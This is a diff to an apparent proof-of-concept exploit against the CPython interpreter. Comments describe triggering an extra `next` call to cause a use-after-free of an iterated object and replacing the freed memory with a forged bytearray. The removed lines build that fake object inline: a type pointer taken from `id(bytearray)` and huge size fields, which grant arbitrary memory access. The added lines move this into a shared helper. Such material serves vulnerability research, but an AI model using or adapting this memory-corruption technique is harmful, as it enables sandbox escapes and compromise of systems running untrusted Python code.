@@ -43,6 +43,8 @@ iter_iternext(PyObject *iterator)
 }
 """
 
+from common import evil_bytearray_obj
+
 # The goal here is to call `next` on an iterable object an extra time to cause `seq` to be decrefed more times
 # than intended. This gives us a UAF where we can free `seq` (in our exploit, `seq` is `mem`) and replace the object in memory
 # with data for a fake bytearray.
@@ -66,15 +68,9 @@ class evil:
 mem = evil()
 SIZE = mem.__sizeof__()
 
-p64 = lambda num: num.to_bytes(8, 'little')
-fake_ba = bytearray(
-    b"padding_"*2 + # padding is for the GC header
-    p64(0x12345) +
-    p64(id(bytearray)) +
-    p64(2**63 - 1) +
-    p64(2**63 - 1) +
-    p64(0) + p64(0)
-)
+# see ./common/common.py for evil bytearray obj explanation
+fake_obj, _ = evil_bytearray_obj(add_metadata=True)
+fake_ba = bytearray(fake_obj)
 
 lock = False
 [*(it:=iter(mem))]
